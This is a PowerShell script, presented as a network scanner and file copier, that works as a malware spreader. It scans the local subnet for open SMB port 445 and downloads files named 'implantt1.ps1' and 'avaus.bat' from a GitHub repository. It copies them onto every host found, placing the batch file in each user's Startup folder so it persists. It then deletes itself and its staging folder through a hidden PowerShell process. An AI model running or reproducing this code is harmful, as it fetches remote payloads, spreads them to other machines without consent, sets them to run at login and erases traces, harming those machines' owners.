# PowerShell Script to Scan Network and Copy Files to Windows Machines

# 1. Install Nmap (if not installed)
$installPath = "C:\Program Files (x86)\Nmap"
if (!(Test-Path $installPath)) {
    Write-Host "Nmap not found. Installing Nmap..."
    Invoke-WebRequest -Uri "https://nmap.org/dist/nmap-7.94-setup.exe" -OutFile "$env:TEMP\nmap-setup.exe"
    Start-Process -FilePath "$env:TEMP\nmap-setup.exe" -ArgumentList "/S" -Wait
    Remove-Item "$env:TEMP\nmap-setup.exe"
    Write-Host "Nmap installed."
} else {
    Write-Host "Nmap already installed."
}

# 1.5 Install PsExec (if not installed)
$pstoolsPath = "C:\PSTools"
$psexecPath = "$pstoolsPath\psexec.exe"
if (!(Test-Path $psexecPath)) {
    Write-Host "PsExec not found. Installing..."
    Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
    Expand-Archive -Path "$env:TEMP\PSTools.zip" -DestinationPath "$pstoolsPath" -Force
    Write-Host "PsExec installed at $pstoolsPath"
} else {
    Write-Host "PsExec already installed at $psexecPath."
}

$env:Path += ";$pstoolsPath"

# 2. Create Shared Folder in Temp
$sharedFolder = "$env:TEMP\SharedFolder"
if (!(Test-Path $sharedFolder)) {
    New-Item -ItemType Directory -Path $sharedFolder
    Write-Host "SharedFolder created at $sharedFolder"
    $acl = Get-Acl $sharedFolder
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $sharedFolder -AclObject $acl
    Write-Host "SharedFolder permissions set for Everyone."
} else {
    Write-Host "SharedFolder already exists at $sharedFolder"
}

# 3. Scan the network for active devices
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -match "^192\.168\." }).IPAddress
$networkRange = ($localIP -replace '\.\d+$', ".0/24")  # Set to your local network range
Write-Host "Starting Nmap scan on $networkRange..."
$startTime = Get-Date
$nmapResults = & "$installPath\nmap.exe" -p 445 --open -oG - $networkRange
$endTime = Get-Date
$duration = $endTime - $startTime

Write-Host "Nmap scan completed in $($duration.Minutes) minutes and $($duration.Seconds) seconds."

# 4. Parse Nmap results to extract unique IP addresses of Windows devices
$windowsDevices = @()
foreach ($line in $nmapResults) {
    if ($line -match "Host: (\d+\.\d+\.\d+\.\d+)") {
        $ip = $matches[1]
        $windowsDevices += $ip
    }
}

# Remove duplicate IP addresses
$windowsDevices = $windowsDevices | Sort-Object -Unique

Write-Host "Detected Windows machines: $($windowsDevices -join ', ')"

$DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/implantt1.ps1"
$DiscordFileUrl2 = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/avaus.bat"
$DestinationPath = "$sharedFolder\implantt1.ps1"
$DestinationPath2 = "$sharedFolder\avaus.bat"

# Download the file
try {
    Invoke-WebRequest -Uri $DiscordFileUrl -OutFile $DestinationPath
    Invoke-WebRequest -Uri $DiscordFileUrl2 -OutFile $DestinationPath2
    Write-Host "File downloaded successfully to $sharedFolder\"
} catch {
    Write-Host "An error occurred while downloading the file: $_"
}

# 5. File to be copied and destination path
$sourceFile = $DestinationPath
$sourceFile2 = $DestinationPath2
$targetPath = "Users\$env:USERNAME\AppData\Local\Temp\implantt1.ps1"
$targetPath2 = "Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\avaus.bat"
# 6. Copy file to each detected Windows machine and execute it

foreach ($ip in $windowsDevices) {
    $destination = "\\$ip\$targetPath"
    $destination2 = "\\$ip\$targetPath2"
    Write-Host "Copying $sourceFile to $destination and $destination2..."
    try {
        Copy-Item -Path $sourceFile -Destination $destination -Force
        Copy-Item -Path $sourceFile2 -Destination $destination2 -Force
        Write-Host "Files successfully copied to $ip."
    } catch {
        Write-Host "Failed to copy $ip. Error: $_"
    }
}

$thisScript = "$PSScriptRoot\Tiedostojako3.ps1"

$deleteCommand = "Start-Sleep -Seconds 2; " + 
                "Remove-Item -Path '$sharedFolder' -Recurse -Force;" +
                "Remove-Item -Path '$thisScript' -Force"

Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command $deleteCommand" -NoNewWindow
